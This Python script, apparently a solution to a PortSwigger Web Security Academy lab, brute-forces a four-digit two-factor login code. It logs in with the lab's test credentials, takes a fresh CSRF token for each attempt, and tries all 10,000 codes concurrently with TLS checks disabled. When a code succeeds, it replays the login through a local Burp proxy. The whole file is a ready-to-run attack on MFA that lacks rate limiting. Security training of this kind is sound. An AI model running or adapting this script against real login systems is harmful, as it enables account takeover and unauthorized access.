#!/usr/bin/env python3

import asyncio
import aiohttp
import re
import ssl
from pwn import log

BASE_URL = "https://0a3d008e047618c0821e307900140009.web-security-academy.net"

ssl_context = ssl.create_default_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

PROXY = "http://127.0.0.1:8080"

found = False
tasks = []

print_lock = asyncio.Lock()


async def get_csrf(session, url):
    async with session.get(url) as r:
        text = await r.text()
        match = re.search(r'name="csrf" value="(.+?)"', text)
        if not match:
            return None
        return match.group(1)


async def login(session):
    csrf = await get_csrf(session, f"{BASE_URL}/login")
    if not csrf:
        return False

    await session.post(f"{BASE_URL}/login", data={
        "csrf": csrf,
        "username": "carlos",
        "password": "montoya"
    })

    return True


async def try_code(code, p2):
    global found

    if found:
        return

    connector = aiohttp.TCPConnector(ssl=ssl_context)

    try:
        async with aiohttp.ClientSession(connector=connector) as session:

            ok = await login(session)
            if not ok or found:
                return

            csrf = await get_csrf(session, f"{BASE_URL}/login2")
            if not csrf or found:
                return

            async with print_lock:
                p2.status(f"code={code} csrf={csrf}")

            data = {
                "csrf": csrf,
                "mfa-code": code
            }

            async with session.post(
                f"{BASE_URL}/login2",
                data=data,
                allow_redirects=False
            ) as r:

                if r.status != 200 and not found:
                    found = True

                    print(f"\n[+] FOUND: {code} (status={r.status})")

                    # 🔥 cancelar todas las tareas
                    for t in tasks:
                        t.cancel()

                    # 🔁 replay por Burp + follow redirect
                    async with aiohttp.ClientSession(connector=connector) as proxy_session:

                        csrf1 = await get_csrf(proxy_session, f"{BASE_URL}/login")

                        await proxy_session.post(
                            f"{BASE_URL}/login",
                            data={
                                "csrf": csrf1,
                                "username": "carlos",
                                "password": "montoya"
                            },
                            proxy=PROXY,
                            ssl=ssl_context
                        )

                        csrf2 = await get_csrf(proxy_session, f"{BASE_URL}/login2")

                        async with proxy_session.post(
                            f"{BASE_URL}/login2",
                            data={
                                "csrf": csrf2,
                                "mfa-code": code
                            },
                            proxy=PROXY,
                            ssl=ssl_context,
                            allow_redirects=True
                        ) as final_resp:

                            final_text = await final_resp.text()

                            print(f"[+] Final status: {final_resp.status}")
                            print(f"[+] Redirected to: {final_resp.url}")

    except asyncio.CancelledError:
        # tarea cancelada limpiamente
        return
    except Exception:
        return


async def main():
    global tasks

    concurrency = 20
    sem = asyncio.Semaphore(concurrency)

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque...")

    p2 = log.progress("Intento actual")

    async def sem_task(i):
        global found

        code = str(i).zfill(4)

        if found:
            return

        try:
            async with sem:
                await try_code(code, p2)

            async with print_lock:
                if not found:
                    p1.status(f"Intento -> {i}/10000")

        except asyncio.CancelledError:
            return

    tasks = [asyncio.create_task(sem_task(i)) for i in range(10000)]

    try:
        await asyncio.gather(*tasks)
    except asyncio.CancelledError:
        pass


if __name__ == "__main__":
    asyncio.run(main())
